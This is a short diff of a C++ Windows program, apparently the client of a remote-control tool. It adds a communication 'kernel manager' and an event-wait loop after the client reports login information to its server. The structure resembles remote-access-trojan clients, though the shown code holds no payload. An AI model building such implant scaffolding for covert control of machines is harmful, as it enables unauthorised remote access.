@@ -4,6 +4,7 @@
 #include<iostream>
 #include"IocpClient.h"
 #include "Login.h"
+#include"KernelManager.h"
 using namespace std;
 
 
@@ -70,6 +71,31 @@ DWORD WINAPI WorkThreadProcedure(LPVOID ParameterData)
 
         SendLoginInformation(&IocpClient, GetTickCount() - TickCount);
 
+        //构建接收数据的机制
+        CKernelManager	KernelManager(&IocpClient);   //负责通信的   抽象类Manager  
+
+        //下线
+        //其他功能的创建
+        //
+        do
+        {
+
+            //等待一个事件
+            int Index = WaitForSingleObject(IocpClient.m_EventHandle, 100);
+
+            if (Index == 0)
+            {
+                break;
+            }
+            else
+            {
+                continue;
+            }
+
+        } while (1);
+
+        //退出整个循环
+        ok = TRUE;
 
         Sleep(INFINITE); 
     }
@@ -77,3 +103,4 @@ DWORD WINAPI WorkThreadProcedure(LPVOID ParameterData)
 
     return 0;
 }
+
